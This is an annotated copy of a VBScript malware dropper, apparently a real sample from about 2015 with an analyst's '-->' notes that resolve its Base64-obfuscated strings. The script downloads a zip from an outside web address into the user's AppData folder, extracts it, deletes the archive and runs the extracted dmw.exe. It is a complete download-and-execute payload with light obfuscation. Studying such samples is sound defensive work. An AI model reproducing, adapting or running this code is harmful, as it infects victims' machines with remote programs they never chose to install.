Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

' #################################################################
' by sysv@ 2015
' #################################################################

Function Base64Decode(ByVal base64String)
  'rfc1521
  '1999 Antonin Foller, Motobit Software, http://Motobit.cz
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin
  
  'remove white spaces, If any
  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")
  
  'The source must consists from groups with Len of 4 chars
  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If

  
  ' Now decode each group:
  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    ' Each data group encodes up To 3 actual bytes.
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3
      ' Convert each character into 6 bits of data, And add it To
      ' an integer For temporary storage.  If a character is a '=', there
      ' is one fewer data byte.  (There can only be a maximum of 2 '=' In
      ' the whole string.)

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next
    
    'Hex splits the long To 6 groups with 4 bits
    nGroup = Hex(nGroup)
    
    'Add leading zeros
    nGroup = String(6 - Len(nGroup), "0") & nGroup
    
    'Convert the 3 byte hex integer (6 chars) To 3 characters
    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))
    
    'add numDataBytes characters To out string
    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function

Function MyASC(OneChar)
  If OneChar = "" Then MyASC = 0 Else MyASC = Asc(OneChar)
End Function

'####################################################################################

set predio = wScript.createObject("WScript.Shell")
lamentavel = predio.expandEnvironmentStrings("%USERNAME%")

Dim reileao, BAILARINA, SOLTAR, dourado, us
BAILARINA = "C:\Users\" & lamentavel & "\AppData\Roaming" 
' Create FileSystemObject. So we can apply .createFolder method
us = Base64Decode("ZG13LmV4ZQ==") --> us = dmw.exe
SOLTAR = BAILARINA & "\" & "dmw.exe" --> SOLTAR = C:\Users\AppData\Roaming\dmw.exe

Set reileao = CreateObject("Scripting.FileSystemObject")
If reileao.FileExists(SOLTAR) Then --> If reileao.FileExists(C:\Users\AppData\Roaming\dmw.exe)
Wscript.Quit
End If

dim DIKMOOOBAILARINAQSSSSSVVVV111113333,questao,responde

questao = "http://editoraexcel.com/img/file/tmp/1.zip"
DIKMOOOBAILARINAQSSSSSVVVV111113333 = "\monumento.zip"
responde = BAILARINA & DIKMOOOBAILARINAQSSSSSVVVV111113333 --> responde = C:\Users\AppData\Roaming\dmw.exe & \monumento.zip

Set reileao = CreateObject("Scripting.FileSystemObject")
If reileao.FileExists(responde) Then --> If reileao.FileExists(C:\Users\AppData\Roaming\dmw.exe & \monumento.zip) Then
  reileao.DeleteFile(responde) --> reileao.DeleteFile(C:\Users\AppData\Roaming\dmw.exe & \monumento.zip)
End If

' Create an HTTP object
Set universal = CreateObject("MSXML2.XMLHTTP")

' Download the specified URL
universal.open "GET", questao, False --> universal.open "GET", http://editoraexcel.com/img/file/tmp/1.zip, False
universal.send

If universal.Status = 200 Then
  Dim cafezinho
  Set cafezinho = CreateObject(Base64Decode("QURPREIuU3RyZWFt")) --> Set cafezinho = CreateObject("ADODB.Stream")
  With cafezinho
    .Type = 1 'adTypeBinary
    .Open
    .Write universal.responseBody
    .SaveToFile responde
    .Close
  End With
  set cafezinho = Nothing
End If


Set objt = CreateObject("Scripting.FileSystemObject")
If objt.FileExists(responde) Then --> If objt.FileExists (C:\Users\AppData\Roaming\dmw.exe & \monumento.zip) Then
set sa = CreateObject("Shell.Application") 
set filesInzip=sa.NameSpace(responde).items --> set filesInzip=sa.NameSpace(C:\Users\AppData\Roaming\dmw.exe & \monumento.zip).items 
sa.NameSpace(BAILARINA).CopyHere(filesInzip) --> sa.NameSpace(C:\Users\AppData\Roaming).CopyHere(sa.NameSpace(C:\Users\AppData\Roaming\dmw.exe & \monumento.zip).items)
End if

Set obj = CreateObject("Scripting.FileSystemObject")
If obj.FileExists(responde) Then --> If obj.FileExists(C:\Users\AppData\Roaming\dmw.exe & \monumento.zip)
obj.DeleteFile(responde) --> obj.DeleteFile(C:\Users\AppData\Roaming\dmw.exe & \monumento.zip)
End If

If reileao.FileExists(SOLTAR) Then --> If reileao.FileExists(C:\Users\AppData\Roaming\dmw.exe)
Dim djnnprrrruuuww, teste1, var
Set djnnprrrruuuww = WScript.CreateObject( "WScript.Shell" )
'teste1 = Base64Decode("U09MVEFS") --> 'teste1 = Base64Decode("SOLTAR") --> 'teste1 = C:\Users\AppData\Roaming\dmw.exe
'var = MsgBox (Teste1, 65, "MsgBox Example") --> var = MsgBox (C:\Users\AppData\Roaming\dmw.exe, 65, "MsgBox Example")
djnnprrrruuuww.Run(SOLTAR) --> djnnprrrruuuww.Run(C:\Users\AppData\Roaming\dmw.exe)
Set djnnprrrruuuww = Nothing
End If

'###########################################################

